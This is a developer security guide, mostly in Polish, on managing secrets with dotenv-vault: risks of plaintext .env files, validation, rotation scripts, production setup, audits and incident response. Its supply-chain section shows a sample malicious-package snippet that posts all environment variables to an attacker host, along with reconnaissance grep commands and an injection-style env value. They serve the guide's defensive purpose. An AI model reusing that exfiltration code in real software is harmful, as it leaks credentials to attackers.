# 🔐 Security & Secrets Management Guide

## Spis treści

- [Dlaczego nie plaintext](#dlaczego-nie-plaintext)
- [Zagrożenia bezpieczeństwa](#zagrożenia-bezpieczeństwa)
- [Dobre praktyki](#dobre-praktyki)
- [Zarządzanie secretami w zespole](#zarządzanie-secretami-w-zespole)
- [Production deployment](#production-deployment)
- [Key rotation procedures](#key-rotation-procedures)
- [Audyt i compliance](#audyt-i-compliance)
- [Incident response](#incident-response)

---

## Dlaczego nie plaintext

### ❌ Problemy z plaintext `.env`:

```env
# ⚠️ NIE RÓB TAK!
DB_PASSWORD=SuperSecret123!
JWT_SECRET=my-secret-key
SMTP_PASSWORD=email-password-here
API_KEY=sk_live_51Hxxxxxxxxxxxxxxx
```

**Co może pójść źle:**

1. **Accidental commit** - Developer przypadkowo commituje `.env` do repo
   ```bash
   # Zdarza się nawet najlepszym:
   git add .
   git commit -m "quick fix"
   git push
   # 💥 Secrets w publicznym repo!
   ```

2. **Repo leak** - Nawet private repo może wyciec:
   - Były pracownik z dostępem
   - Zhackowane konto GitHub
   - Publiczne fork
   - Backup w niewłaściwym miejscu

3. **Log exposure** - Secrets w logach:
   ```javascript
   // ❌ Niebezpieczne!
   console.log('Config:', process.env);
   // Wszystkie secrets w logach!
   ```

4. **Developer laptops** - Plaintext secrets na:
   - Niezaszyfrowanych dyskach
   - W backup'ach Time Machine
   - W .bash_history
   - W edytorze (history, cache)

5. **Brak rotacji** - Gdy secrets są plaintext:
   - Nikt ich nie rotuje (za dużo pracy)
   - Stare secrets żyją latami
   - Kompromitacja == game over

6. **Brak audytu** - Kto ma dostęp?
   - Kto ostatnio zmieniał?
   - Kiedy secret był użyty?
   - Impossible to track w plaintext

### ✅ Zalety encrypted secrets (dotenv-vault):

```bash
# Commit safely:
git add .env.vault  # ✓ Encrypted, safe to commit
git push

# Production:
DOTENV_VAULT_PRODUCTION_KEY=xxx  # ✓ Single key, manageable

# Rotation:
npm run env:push  # ✓ Easy rotation
npm run env:build # ✓ Automatic encryption

# Audit:
# ✓ Who accessed: tracked by vault
# ✓ When changed: git history
# ✓ What changed: git diff .env.vault (encrypted)
```

---

## Zagrożenia bezpieczeństwa

### 🎯 Common attack vectors:

#### 1. **GitHub/GitLab reconnaissance**

Attackers scan public repos for:
```bash
# Szukają wzorców:
grep -r "DB_PASSWORD=" .
grep -r "API_KEY=" .
grep -r "sk_live_" .
grep -r "-----BEGIN PRIVATE KEY-----" .
```

**Ochrona**: Encrypted `.env.vault` jest bezużyteczny bez klucza.

#### 2. **Supply chain attacks**

Złośliwe npm packages mogą:
```javascript
// Malicious package czyta process.env
const secrets = JSON.stringify(process.env);
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: secrets
});
```

**Ochrona**: 
- Audytuj dependencies
- Use `npm audit`
- Lock file versions
- Minimal dependencies

#### 3. **Log aggregation exposure**

```javascript
// ❌ NIE:
logger.info('Database config:', dbConfig);

// ✅ TAK:
logger.info('Database connection established', {
  host: dbConfig.host,
  database: dbConfig.database
  // NO password!
});
```

#### 4. **Error messages**

```javascript
// ❌ NIE:
throw new Error(`Failed to connect: ${connectionString}`);

// ✅ TAK:
throw new Error('Failed to connect to database');
// Log details separately (nie w error message)
```

#### 5. **Environment variable injection**

Na shared hosting:
```bash
# Attacker może próbować:
NODE_ENV="production'; DROP TABLE users; --"
```

**Ochrona**: Walidacja wszystkich env vars.

---

## Dobre praktyki

### 🛡️ Zasada najmniejszych uprawnień

```yaml
# Różne klucze dla różnych środowisk:
development:   dotenv://:key_dev_xxxxx      # Full access, all vars
staging:       dotenv://:key_staging_xxxxx  # Production-like
production:    dotenv://:key_prod_yyyyy     # Only production secrets
ci:            dotenv://:key_ci_zzzzz       # Limited, test data only
```

### 🔐 Silne secrets

**Generowanie bezpiecznych secrets:**

```bash
# JWT Secret (256-bit)
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Output: 4f3b8c9d2e1a7f6b5d4c3a2e1f9d8b7a6c5d4e3f2a1b9c8d7e6f5a4b3c2d1e0

# API Key (longer)
node -e "console.log(require('crypto').randomBytes(48).toString('base64'))"
# Output: Xj8kL9mN3qR5sT7vW1xZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR2sT4uV6wX8yZ0aB2c

# Password (complex)
openssl rand -base64 32
# Output: Kj9mN3qR5sT7vW1xZ4aB6cD8eF0gH2iJ4kL6mN8oP0qR==
```

**Wymagania:**
- Minimum 32 znaki
- Mix: uppercase, lowercase, digits, special chars
- NIGDY nie używaj słów ze słownika
- NIGDY nie reuse między środowiskami

### 🚫 Co NIGDY nie commitować

```bash
# ❌ NIGDY:
.env
.env.local
.env.production
.env.keys          # Klucze deszyfrujące
.env.me            # Osobisty klucz

# ❌ NIGDY (credentials w kodzie):
const password = "hardcoded-pass";
const apiKey = "sk_live_xxxxx";

# ❌ NIGDY (w komentarzach):
// TODO: Use password "Admin123!" for now

# ✅ MOŻNA:
.env.example       # Placeholders only
.env.vault         # Encrypted secrets
```

### 📝 .env.example best practices

```env
# ✅ DOBRE - instrukcje i placeholders:
# Database Configuration
# Production: Use RDS endpoint
# Development: Use localhost
DB_HOST=localhost
DB_PORT=5432
DB_NAME=your_database_name
DB_USER=your_db_username
DB_PASSWORD=generate-secure-password-here

# JWT Configuration
# Generate with: node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
JWT_SECRET=your-jwt-secret-min-32-chars
JWT_EXPIRES_IN=8h

# ❌ ZŁE - prawdziwe wartości:
DB_PASSWORD=MyRealPassword123!
JWT_SECRET=actual-secret-key-dont-do-this
```

### 🔍 Walidacja zmiennych środowiskowych

```typescript
// src/config/env.validator.ts
import { z } from 'zod';

const envSchema = z.object({
  NODE_ENV: z.enum(['development', 'staging', 'production']),
  PORT: z.string().regex(/^\d+$/).transform(Number),
  
  // Database
  DB_HOST: z.string().min(1),
  DB_PORT: z.string().regex(/^\d+$/).transform(Number),
  DB_NAME: z.string().min(1),
  DB_USER: z.string().min(1),
  DB_PASSWORD: z.string().min(8), // Minimum password length
  
  // JWT - strong requirements
  JWT_SECRET: z.string().min(32, 'JWT secret must be at least 32 chars'),
  JWT_EXPIRES_IN: z.string().regex(/^\d+[smhd]$/),
  
  // SMTP
  SMTP_HOST: z.string().min(1),
  SMTP_USER: z.string().email(),
  SMTP_PASSWORD: z.string().min(8),
});

export function validateEnv() {
  try {
    return envSchema.parse(process.env);
  } catch (error) {
    console.error('❌ Environment validation failed:');
    console.error(error);
    process.exit(1);
  }
}

// Usage in index.ts:
import { validateEnv } from './config/env.validator';
validateEnv(); // Fail fast jeśli env niepoprawny
```

### 🔒 Runtime secret protection

```typescript
// src/utils/redact.ts
export function redactSensitive(obj: any): any {
  const sensitive = ['password', 'secret', 'token', 'key', 'auth'];
  
  if (typeof obj !== 'object' || obj === null) return obj;
  
  const redacted = { ...obj };
  
  for (const key in redacted) {
    const lowerKey = key.toLowerCase();
    
    if (sensitive.some(s => lowerKey.includes(s))) {
      redacted[key] = '***REDACTED***';
    } else if (typeof redacted[key] === 'object') {
      redacted[key] = redactSensitive(redacted[key]);
    }
  }
  
  return redacted;
}

// Usage:
import { redactSensitive } from './utils/redact';

logger.info('Config loaded:', redactSensitive({
  database: {
    host: process.env.DB_HOST,
    password: process.env.DB_PASSWORD // Will be redacted
  }
}));
```

---

## Zarządzanie secretami w zespole

### 👥 Onboarding nowego developera

**Checklist dla team leadera:**

```bash
# 1. Dodaj do GitHub org/repo
# 2. Wyślij welcome email z instrukcjami:

"""
Witaj w zespole Der-Mag!

Setup secrets:
1. Przeczytaj: backend/docs/ENCRYPTED_ENV_SETUP.md
2. Zainstaluj projekt: git clone ... && npm install
3. Twój klucz development (PRYWATNY, nie udostępniaj!):
   
   DOTENV_VAULT_DEVELOPMENT_KEY=dotenv://:key_dev_xxxxxxxxxxxx
   
   Dodaj go do swojego lokalnego .env
   
4. Start app: npm run dev
5. Verify: curl http://localhost:3000/health

Bezpieczeństwo:
- NIGDY nie commituj .env
- NIGDY nie udostępniaj klucza development publicznie
- Pytania? Zapytaj @team-lead

Dokumentacja: backend/docs/SECURITY_SECRETS_GUIDE.md
"""

# 3. Zapisz w 1Password:
# - Who received key
# - When
# - Which key (development)
```

### 🚪 Offboarding developera

**Checklist przy odejściu z zespołu:**

```bash
# 1. Usuń z GitHub org/repo
# 2. Rotuj wszystkie secrets do których miał dostęp

# Automatyczny script:
#!/bin/bash
# scripts/offboard-developer.sh

echo "🔒 Rotacja secrets po odejściu developera"

# Generate new secrets
NEW_JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
NEW_DB_PASSWORD=$(openssl rand -base64 24)

# Update .env
echo "JWT_SECRET=$NEW_JWT_SECRET" > .env.tmp
echo "DB_PASSWORD=$NEW_DB_PASSWORD" >> .env.tmp

# Push to vault
npm run env:push

# Rebuild
npm run env:build

# Generate new keys
npm run env:keys > new-keys.txt

echo "✅ Secrets rotated. New keys in new-keys.txt"
echo "📧 Email new keys to team members"

# 3. Zmień hasła do:
# - Bazy danych
# - Email SMTP
# - External APIs (jeśli miał dostęp)

# 4. Przegląd access logs:
# - Kiedy ostatnio developer był aktywny?
# - Czy były podejrzane aktywności?

# 5. Update dokumentacji:
# - Usuń z listy team members
# - Update emergency contacts
```

### 🔄 Regular team rotations

**Harmonogram rotacji (zalecane):**

```yaml
Quarterly (co 3 miesiące):
  - JWT_SECRET
  - Session secrets
  
Semi-annual (co 6 miesięcy):
  - Database passwords
  - Redis password
  - Internal API keys
  
Annual:
  - External API keys (Stripe, SendGrid, etc.)
  - SSL certificates
  - SSH keys
  
Ad-hoc (natychmiast):
  - Suspected breach
  - Team member departure
  - Third-party breach notification
```

**Script dla quarterly rotation:**

```bash
#!/bin/bash
# scripts/quarterly-rotation.sh

echo "🔐 Quarterly Secrets Rotation"
echo "Date: $(date)"

# Backup current .env
cp .env .env.backup.$(date +%Y%m%d)

# Generate new JWT secret
NEW_JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")

# Update .env
sed -i "s/^JWT_SECRET=.*/JWT_SECRET=$NEW_JWT_SECRET/" .env

# Session secret if exists
if grep -q "SESSION_SECRET" .env; then
  NEW_SESSION_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
  sed -i "s/^SESSION_SECRET=.*/SESSION_SECRET=$NEW_SESSION_SECRET/" .env
fi

# Push to vault
npm run env:push

# Rebuild
npm run env:build

# Commit
git add .env.vault
git commit -m "security: quarterly secrets rotation $(date +%Y-%m-%d)"

echo "✅ Rotation complete"
echo "📧 Notify team: All users will need to re-login"
echo "🔑 New keys available: npm run env:keys"
```

### 📞 Communication protocols

**Udostępnianie secrets - BEZPIECZNE metody:**

✅ **1Password Shared Vault** (najlepsze)
```
1. Utwórz shared vault "Der-Mag Dev Secrets"
2. Dodaj environment keys
3. Udostępnij developerom
4. Automatic rotation reminders
```

✅ **Signal / Telegram** (encrypted messaging)
```
Signal: End-to-end encrypted
- Disappearing messages (24h)
- Screenshot protection
- No cloud backup
```

✅ **PGP Encrypted Email**
```bash
# Encrypt with developer's public key:
gpg --encrypt --armor \
  --recipient developer@dermag.lan \
  secrets.txt

# Send encrypted.asc via email
```

❌ **NIGDY:**
- Slack (persistent, searchable)
- Teams (corporate access)
- Email plaintext
- SMS
- WhatsApp
- Google Docs

---

## Production deployment

### 🚀 Production checklist

Przed każdym production deployment:

```markdown
## Pre-Deployment Security Checklist

### Secrets Management
- [ ] All production secrets in vault
- [ ] .env.vault up to date
- [ ] Production key NOT in repo
- [ ] Production key in secure storage (AWS Secrets Manager / Vault)
- [ ] Old secrets rotated (if scheduled)
- [ ] Team notified of upcoming deployment

### Code Review
- [ ] No hardcoded credentials
- [ ] No console.log with sensitive data
- [ ] Error messages don't expose secrets
- [ ] All env vars validated at startup
- [ ] Sensitive data redacted in logs

### Infrastructure
- [ ] DOTENV_VAULT_PRODUCTION_KEY set correctly
- [ ] .env.vault file present in deployment
- [ ] No .env file in production (use vault key only)
- [ ] Firewall rules: vault.dotenv.org accessible (if needed)
- [ ] Monitoring: secret access logged

### Testing
- [ ] Smoke test in staging with production-like secrets
- [ ] Verify all integrations work (DB, SMTP, APIs)
- [ ] Load test with production configuration
- [ ] Rollback plan ready

### Compliance
- [ ] Secret access logged
- [ ] Audit trail for changes
- [ ] Encryption at rest verified
- [ ] Encryption in transit verified
```

### 🔧 Production environment setup

**AWS Example:**

```bash
# 1. Store production key in AWS Secrets Manager
aws secretsmanager create-secret \
  --name dermag/vault-production-key \
  --description "Dotenv Vault Production Key" \
  --secret-string "dotenv://:key_production_xxxxxxxxxxxxx"

# 2. EC2 User Data (or ECS Task Definition)
#!/bin/bash
# Fetch key from Secrets Manager
VAULT_KEY=$(aws secretsmanager get-secret-value \
  --secret-id dermag/vault-production-key \
  --query SecretString \
  --output text)

# Export for application
export DOTENV_VAULT_PRODUCTION_KEY="$VAULT_KEY"

# Start application
cd /app
npm start

# 3. IAM Policy for EC2/ECS
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "secretsmanager:GetSecretValue"
      ],
      "Resource": "arn:aws:secretsmanager:region:account:secret:dermag/vault-production-key-*"
    }
  ]
}
```

**Docker Secrets Example:**

```bash
# 1. Create Docker secret
echo "dotenv://:key_production_xxxxxxxxxxxxx" | \
  docker secret create dermag_vault_key -

# 2. Docker Compose
version: '3.8'
services:
  api:
    image: der-mag-backend:latest
    secrets:
      - dermag_vault_key
    environment:
      - NODE_ENV=production
    entrypoint: /bin/sh -c "export DOTENV_VAULT_PRODUCTION_KEY=$$(cat /run/secrets/dermag_vault_key) && npm start"

secrets:
  dermag_vault_key:
    external: true
```

### 📊 Production monitoring

**Detect secret compromise:**

```javascript
// src/middleware/security-monitoring.ts
import { Request, Response, NextFunction } from 'express';

export function monitorSecretAccess(req: Request, res: Response, next: NextFunction) {
  // Log all authentication attempts
  if (req.path === '/api/auth/login') {
    logger.warn('Authentication attempt', {
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString(),
      // DO NOT LOG: password, credentials
    });
  }
  
  // Detect brute force
  const failedAttempts = getFailedAttempts(req.ip);
  if (failedAttempts > 5) {
    logger.error('Possible brute force attack', {
      ip: req.ip,
      attempts: failedAttempts
    });
    // Alert security team
    notifySecurityTeam({
      type: 'BRUTE_FORCE',
      ip: req.ip,
      attempts: failedAttempts
    });
  }
  
  next();
}
```

**Set up alerts:**

```yaml
# CloudWatch Alarms / Prometheus Alerts
alerts:
  - name: FailedLoginAttempts
    condition: count(failed_logins) > 10 in 5m
    action: notify_security_team
    
  - name: UnauthorizedAPIAccess
    condition: count(401_responses) > 50 in 1m
    action: notify_security_team
    
  - name: DatabaseConnectionErrors
    condition: count(db_errors) > 5 in 1m
    action: check_db_credentials
    
  - name: SMTPAuthFailures
    condition: count(smtp_auth_failed) > 3 in 5m
    action: check_smtp_credentials
```

---

## Key rotation procedures

### 🔄 Emergency rotation (suspected breach)

**Immediate actions:**

```bash
#!/bin/bash
# scripts/emergency-rotation.sh

echo "🚨 EMERGENCY SECRET ROTATION"
echo "Initiated by: $(whoami)"
echo "Timestamp: $(date -Iseconds)"

# 1. Generate ALL new secrets
NEW_JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
NEW_DB_PASSWORD=$(openssl rand -base64 24)
NEW_SMTP_PASSWORD=$(openssl rand -base64 24)
NEW_SESSION_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")

# 2. Backup old .env
cp .env .env.emergency-backup.$(date +%Y%m%d-%H%M%S)

# 3. Update database password FIRST
psql -U postgres -c "ALTER USER dermag_user WITH PASSWORD '$NEW_DB_PASSWORD';"

# 4. Update SMTP password (via provider UI)
echo "⚠️  MANUAL STEP: Change SMTP password at https://your-smtp-provider.com"
echo "New password: $NEW_SMTP_PASSWORD"
read -p "Press enter when done..."

# 5. Update .env
cat > .env.emergency << EOF
JWT_SECRET=$NEW_JWT_SECRET
DB_PASSWORD=$NEW_DB_PASSWORD
SMTP_PASSWORD=$NEW_SMTP_PASSWORD
SESSION_SECRET=$NEW_SESSION_SECRET
EOF

# 6. Merge with existing .env
# (keep other non-rotated vars)
./scripts/merge-env.sh .env .env.emergency > .env.new
mv .env.new .env

# 7. Push to vault
npm run env:push

# 8. Rebuild
npm run env:build

# 9. Commit
git add .env.vault
git commit -m "SECURITY: Emergency secret rotation - suspected breach"
git push

# 10. Notify team
./scripts/notify-team.sh "URGENT: Secrets rotated due to suspected breach. Pull and restart immediately."

# 11. Invalidate all sessions
redis-cli FLUSHDB

# 12. Restart all services
sudo systemctl restart der-mag-backend

echo "✅ Emergency rotation complete"
echo "📝 Document in incident log"
```

### 📅 Scheduled rotation

**Monthly rotation script:**

```bash
#!/bin/bash
# scripts/monthly-rotation.sh

# Run on first Monday of each month
if [ "$(date +%d)" -gt 7 ]; then
  echo "Skipping - not first week of month"
  exit 0
fi

if [ "$(date +%u)" -ne 1 ]; then
  echo "Skipping - not Monday"
  exit 0
fi

echo "📅 Monthly scheduled rotation"

# Rotate only session/JWT secrets (low impact)
NEW_JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
sed -i "s/^JWT_SECRET=.*/JWT_SECRET=$NEW_JWT_SECRET/" .env

npm run env:push
npm run env:build

git add .env.vault
git commit -m "security: monthly JWT rotation"
git push

# Notify team (maintenance window)
./scripts/notify-team.sh "Scheduled secret rotation tonight at 2am UTC. Brief service interruption expected."

# Schedule restart for 2am
echo "sudo systemctl restart der-mag-backend" | at 02:00
```

### 🔍 Audit rotation history

```bash
#!/bin/bash
# scripts/audit-rotations.sh

echo "🔍 Secret Rotation Audit"
echo "========================"

# Git history of .env.vault changes
git log --oneline --all --graph --decorate -- .env.vault | head -20

echo ""
echo "Recent rotations:"
git log --oneline --since="6 months ago" --grep="rotation" --grep="rotate"

echo ""
echo "Rotation frequency:"
git log --since="1 year ago" --oneline -- .env.vault | wc -l
echo "rotations in last 12 months"

# Check if overdue
LAST_ROTATION=$(git log -1 --format=%ct -- .env.vault)
NOW=$(date +%s)
DAYS_AGO=$(( ($NOW - $LAST_ROTATION) / 86400 ))

echo ""
echo "Last rotation: $DAYS_AGO days ago"

if [ $DAYS_AGO -gt 90 ]; then
  echo "⚠️  WARNING: Rotation overdue! (>90 days)"
  echo "Run: npm run env:push && npm run env:build"
fi
```

---

## Audyt i compliance

### 📋 GDPR / ISO 27001 compliance

**Requirements:**

1. **Encryption at rest** ✅ dotenv-vault (AES-256-GCM)
2. **Encryption in transit** ✅ HTTPS/TLS 1.3
3. **Access control** ✅ Separate keys per environment
4. **Audit logging** ✅ Git history + application logs
5. **Data retention** ✅ Configurable
6. **Right to be forgotten** ✅ Secret deletion supported

**Audit log example:**

```typescript
// src/services/audit-logger.ts
import { createWriteStream } from 'fs';
import { join } from 'path';

const auditLog = createWriteStream(
  join(__dirname, '../../logs/audit.log'),
  { flags: 'a' }
);

export function logSecretAccess(event: {
  type: 'SECRET_READ' | 'SECRET_WRITE' | 'SECRET_DELETE' | 'KEY_ROTATION';
  secret: string; // Name only, not value!
  user: string;
  timestamp: Date;
  success: boolean;
}) {
  const entry = {
    ...event,
    timestamp: event.timestamp.toISOString(),
  };
  
  auditLog.write(JSON.stringify(entry) + '\n');
  
  // Also send to central logging (ELK, CloudWatch)
  centralLogger.info('AUDIT', entry);
}

// Usage:
logSecretAccess({
  type: 'SECRET_READ',
  secret: 'DB_PASSWORD',
  user: req.user?.email || 'system',
  timestamp: new Date(),
  success: true
});
```

### 🔎 Regular security audits

**Weekly automated audit:**

```bash
#!/bin/bash
# scripts/weekly-audit.sh

echo "🔎 Weekly Security Audit - $(date)"

# 1. Check for secrets in code
echo "Scanning for hardcoded secrets..."
if git grep -i "password\s*=\s*['\"]" -- '*.ts' '*.js'; then
  echo "❌ Found hardcoded passwords!"
  exit 1
fi

# 2. Check for committed .env
if git ls-files | grep -q "^.env$"; then
  echo "❌ .env is tracked in git!"
  exit 1
fi

# 3. Check .env.vault is up to date
if [ .env -nt .env.vault ]; then
  echo "⚠️  .env is newer than .env.vault - rebuild needed"
fi

# 4. Audit npm packages
npm audit --production --audit-level=moderate

# 5. Check key rotation schedule
LAST_ROTATION=$(git log -1 --format=%ct -- .env.vault)
NOW=$(date +%s)
DAYS_AGO=$(( ($NOW - $LAST_ROTATION) / 86400 ))

if [ $DAYS_AGO -gt 90 ]; then
  echo "⚠️  Keys not rotated in 90+ days"
fi

# 6. Check for exposed keys in GitHub
gh secret list # Verify GitHub Actions secrets are set

echo "✅ Weekly audit complete"
```

---

## Incident response

### 🚨 Response plan for secret exposure

**Phase 1: Detection (0-5 minutes)**

```bash
# Someone reports: "I accidentally committed .env to GitHub"

# 1. IMMEDIATELY rotate ALL secrets
./scripts/emergency-rotation.sh

# 2. Revoke compromised credentials
# - Database: ALTER USER ... WITH PASSWORD '...'
# - APIs: Revoke keys in provider dashboards
# - JWT: rotation invalidates all tokens
```

**Phase 2: Containment (5-30 minutes)**

```bash
# 1. Remove from Git history
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch .env' \
  --prune-empty --tag-name-filter cat -- --all

# 2. Force push (if necessary)
git push origin --force --all
git push origin --force --tags

# 3. Notify GitHub to purge cache
# (if public repo)
gh api repos/{owner}/{repo}/notifications

# 4. Monitor access logs
tail -f /var/log/nginx/access.log | grep -i "suspicious patterns"
```

**Phase 3: Investigation (30-120 minutes)**

```markdown
## Incident Report Template

### Summary
- Date/Time: 2024-01-15 14:32 UTC
- Reporter: developer@dermag.lan
- Severity: HIGH
- Type: Accidental secret exposure

### What happened?
- Developer committed .env to feature branch
- Branch pushed to GitHub
- Exposure duration: ~15 minutes
- Secrets exposed: DB_PASSWORD, JWT_SECRET, SMTP_PASSWORD

### Impact
- Database password: ROTATED
- JWT tokens: ALL INVALIDATED (users must re-login)
- SMTP: ROTATED
- No unauthorized access detected

### Timeline
- 14:32 - Exposure occurred
- 14:35 - Detected by GitHub secret scanning
- 14:37 - Emergency rotation initiated
- 14:45 - All secrets rotated
- 14:47 - Git history cleaned
- 15:00 - Monitoring established

### Actions taken
1. Emergency secret rotation completed
2. Git history purged
3. All active sessions invalidated
4. Monitoring increased for 7 days
5. Team notified

### Prevention
1. Add pre-commit hook to prevent .env commits
2. Require code review for all merges
3. Additional training on secret management
4. Weekly audit script enforcement

### Follow-up
- [ ] Monitor logs for 7 days
- [ ] Review with team in retro
- [ ] Update documentation
- [ ] Scheduled rotation in 30 days
```

**Phase 4: Recovery (2-24 hours)**

```bash
# 1. Verify all systems operational
curl -f http://localhost:3000/health || exit 1

# 2. Verify no unauthorized access
./scripts/check-access-logs.sh --since="1 hour ago"

# 3. Document incident
./scripts/incident-report.sh > incidents/2024-01-15-secret-exposure.md

# 4. Notify stakeholders
./scripts/notify-stakeholders.sh incident-closed
```

### 🛡️ Prevention measures

**Pre-commit hook:**

```bash
# .git/hooks/pre-commit
#!/bin/bash

# Prevent committing .env files
if git diff --cached --name-only | grep -q "^.env$"; then
  echo "❌ ERROR: Attempting to commit .env file!"
  echo "This file contains secrets and should never be committed."
  echo "Use .env.vault instead."
  exit 1
fi

# Scan for potential secrets in code
if git diff --cached | grep -iE "(password|secret|key|token)\s*=\s*['\"][^'\"]{8,}"; then
  echo "⚠️  WARNING: Potential hardcoded secret detected!"
  echo "Please review your changes."
  read -p "Continue anyway? (y/N) " -n 1 -r
  echo
  if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
  fi
fi

# Check for API keys pattern
if git diff --cached | grep -iE "sk_live_|pk_live_|api_key_"; then
  echo "❌ ERROR: API key detected in diff!"
  exit 1
fi

exit 0
```

Install for all developers:

```bash
# scripts/install-hooks.sh
#!/bin/bash
cp .git/hooks/pre-commit.sample .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

echo "✅ Git hooks installed"
echo "Pre-commit hook will prevent .env commits"
```

---

## Szybki checklist

### Daily
- [ ] Check monitoring alerts
- [ ] Review access logs (if suspicious activity)

### Weekly
- [ ] Run `scripts/weekly-audit.sh`
- [ ] Review npm audit results
- [ ] Check rotation schedule

### Monthly
- [ ] Rotate JWT/session secrets
- [ ] Review team access list
- [ ] Audit third-party integrations

### Quarterly
- [ ] Full secret rotation (DB, JWT, sessions)
- [ ] Security training refresh
- [ ] Incident response drill

### Annually
- [ ] Rotate ALL secrets (including external APIs)
- [ ] Review and update security policies
- [ ] Compliance audit (GDPR, ISO 27001)

---

## Dodatkowe zasoby

- 🔐 [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)
- 📖 [NIST Guidelines for Key Management](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)
- 🛡️ [CIS Critical Security Controls](https://www.cisecurity.org/controls)
- 📋 [GDPR Article 32 - Security of Processing](https://gdpr-info.eu/art-32-gdpr/)

---

**Der-Mag Platform** - Security First 🛡️
